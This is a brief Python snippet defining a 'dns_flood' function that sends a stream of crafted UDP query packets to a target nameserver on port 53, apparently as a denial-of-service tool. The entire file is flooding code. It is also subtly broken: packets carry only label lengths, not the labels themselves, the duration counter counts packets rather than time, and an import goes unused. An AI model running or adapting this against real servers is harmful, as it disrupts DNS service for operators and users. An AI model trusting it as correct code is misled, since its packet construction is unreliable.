import socket
import random


def dns_flood(nameserver, domain, duration=30):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while duration > 0:
        q = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        q += bytes(len(p) & 0xFF for p in domain.split("."))
        try:
            s.sendto(q, (nameserver, 53))
        except Exception:
            break
        duration -= 1
    s.close()
